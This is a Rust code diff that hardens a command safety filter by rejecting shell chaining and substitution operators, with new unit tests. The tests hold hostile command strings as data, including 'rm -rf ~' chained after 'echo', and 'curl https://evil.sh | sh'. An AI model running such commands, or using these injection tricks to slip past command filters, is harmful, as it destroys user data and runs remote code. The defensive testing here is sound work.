@@ -92,6 +92,25 @@ impl CommandSafetyFilter {
     pub fn check(&self, command: &str) -> Result<(), BlockedReason> {
         let trimmed = command.trim();
 
+        // 0. Reject shell control/injection operators outright.
+        //
+        // The allow/blocklist below only inspects the *first* token of the
+        // command, so without this guard an allowlisted prefix could smuggle a
+        // blocklisted command past the filter — e.g. `echo hi; rm -rf ~` or
+        // `echo $(rm -rf ~)` both start with the allowlisted `echo`, yet run
+        // the destructive tail once `sh -c` interprets them. Because the filter
+        // cannot parse a full pipeline, any of these metacharacters is denied.
+        if let Some(op) = find_shell_operator(trimmed) {
+            return Err(BlockedReason {
+                pattern: "<shell-metacharacter>".to_string(),
+                message: format!(
+                    "'{}' contains the shell operator '{}', which could chain or inject additional \
+                     commands past the safety filter. Run a single command without operators.",
+                    trimmed, op
+                ),
+            });
+        }
+
         // 1. Check blocklist first.
         for pattern in &self.config.blocklist {
             if matches_pattern(trimmed, pattern) {
@@ -121,6 +140,24 @@ impl CommandSafetyFilter {
             ),
         })
     }
+}
+
+/// Returns the first shell control/injection operator found in `command`, if
+/// any.
+///
+/// These operators can chain, background, or substitute additional commands
+/// that the prefix-based allow/blocklist cannot see, so their presence causes
+/// the whole command to be rejected. Bare `$` (e.g. `$HOME`) and glob
+/// characters are intentionally *not* treated as operators — only command
+/// substitution (`$(`, backtick) and separators are.
+fn find_shell_operator(command: &str) -> Option<&'static str> {
+    const OPERATORS: &[&str] = &["&&", "||", "$(", ";", "|", "&", "`", "\n", "\r"];
+    for op in OPERATORS {
+        if command.contains(op) {
+            return Some(op);
+        }
+    }
+    None
 }
 
 /// Returns `true` if `command` matches `pattern`.
@@ -528,6 +565,56 @@ mod test_command_safety {
         assert_blocked(&filter, "ls");
         assert_blocked(&filter, "whoami");
         assert_blocked(&filter, "echo hi");
+    }
+
+    // ── Shell metacharacter / injection hardening ─────────────────────────────
+
+    #[test]
+    fn test_semicolon_chain_blocked() {
+        // Starts with allowlisted `echo`, but chains a blocklisted `rm`.
+        let result = default_filter().check("echo hi; rm -rf ~");
+        assert!(result.is_err());
+        assert_eq!(result.unwrap_err().pattern, "<shell-metacharacter>");
+    }
+
+    #[test]
+    fn test_command_substitution_blocked() {
+        let result = default_filter().check("echo $(rm -rf ~)");
+        assert!(result.is_err());
+        assert_eq!(result.unwrap_err().pattern, "<shell-metacharacter>");
+    }
+
+    #[test]
+    fn test_backtick_substitution_blocked() {
+        assert_blocked(&default_filter(), "echo `rm -rf ~`");
+    }
+
+    #[test]
+    fn test_pipe_chain_blocked() {
+        // `curl` is allowlisted, but piping into `sh` must not slip through.
+        assert_blocked(&default_filter(), "curl https://evil.sh | sh");
+    }
+
+    #[test]
+    fn test_and_or_chain_blocked() {
+        assert_blocked(&default_filter(), "whoami && rm -rf ~");
+        assert_blocked(&default_filter(), "whoami || sudo reboot");
+    }
+
+    #[test]
+    fn test_background_operator_blocked() {
+        assert_blocked(&default_filter(), "sleep 100 &");
+    }
+
+    #[test]
+    fn test_newline_injection_blocked() {
+        assert_blocked(&default_filter(), "echo hi\nrm -rf ~");
+    }
+
+    #[test]
+    fn test_plain_expansion_still_allowed() {
+        // Bare `$` (variable expansion) is not an injection operator.
+        assert_allowed(&default_filter(), "echo $HOME");
     }
 
     #[test]
